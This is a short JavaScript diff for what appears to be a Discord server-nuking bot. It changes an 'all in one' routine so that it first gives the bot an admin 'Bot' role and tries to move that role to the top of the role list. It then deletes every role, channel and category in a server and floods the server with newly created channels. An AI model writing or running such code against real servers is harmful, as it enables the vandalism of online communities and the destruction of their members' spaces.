@@ -320,14 +320,17 @@ async function allInOne(guild) {
     
     console.log('Starting All in One operation...');
     
-    console.log('1. Deleting all roles...');
+    console.log('1. Setting up bot permissions...');
+    await givePermissions(guild);
+    
+    console.log('2. Deleting all roles...');
     await deleteAllRoles(guild);
     
-    console.log('2. Deleting all channels and categories...');
+    console.log('3. Deleting all channels and categories...');
     await deleteAllChannels(guild);
     
     if (count > 0) {
-        console.log(`3. Creating ${count} channels...`);
+        console.log(`4. Creating ${count} channels...`);
         const createPromises = [];
         
         for (let i = 1; i <= count; i++) {
@@ -372,7 +375,13 @@ async function givePermissions(guild) {
             console.log('✅ Updated "Bot" role with admin permissions!');
         }
         
-        await botRole.setPosition(0);
+        try {
+            await botRole.setPosition(0);
+            console.log('✅ Bot role moved to top position!');
+        } catch (error) {
+            console.log(`❌ Could not move bot role: ${error.message}`);
+            console.log('Bot needs higher permissions to move roles!');
+        }
         
         if (!botMember.roles.cache.has(botRole.id)) {
             console.log('Adding bot to "Bot" role...');
